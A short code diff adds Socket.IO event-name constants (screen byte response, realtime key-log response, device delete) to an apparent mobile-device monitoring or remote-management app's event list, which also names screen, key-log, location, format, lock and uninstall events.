@@ -17,6 +17,7 @@ export const SocketIOPublicEvents = {
 	//Monitors
 	SCREEN_MONITOR: "screen-monitor",
 	SCREEN_MOBILE_RESPONSE: "screen-mobile-response",
+	SCREEN_MOBILE_BYTE_RESPONSE: "screen-mobile-byte-response",
 	SCREEN_SHARE: "screen-shared",
 
 	SCREEN_SKELETON: "screen-skeleton",
@@ -35,6 +36,7 @@ export const SocketIOPublicEvents = {
 
 	KEY_MONITOR: "key-monitor",
 	KEY_MOBILE_RESPONSE: "key-logs-mobile-response",
+	KEY_MOBILE_REALTIME_RESPONSE: "key-logs-realtime-mobile-response",
 	KEY_SHARE: "key-logs-shared",
 
 	LOCATION_MONITOR: "location-monitor",
@@ -97,6 +99,7 @@ export const SocketIOPublicEvents = {
 	DEVICE_FORMAT_RESPONSE: "format-mobile-response",
 	DEVICE_FORMAT_SHARED: "device-format-shared",
 	DEVICE_LOCK_EVENT: "device-lock-event",
+	DEVICE_DELETE_EVENT: "device-delete-event",
 
 	// Uninstall APP
 	UNINSTALL_APP_EVENT: "uninstall-app-event",
@@ -151,6 +154,7 @@ export const SocketIOMobileEvents = {
 
 	// Device
 	MOBILE_DEVICE_FORMAT_EVENT: "mb-device-format-event",
+	MOBILE_DEVICE_DELETE_EVENT: "mb-device-delete-event",
 
 	// Uninstall APP
 	MOBILE_UNINSTALL_APP_EVENT: "mb-uninstall-app-event",
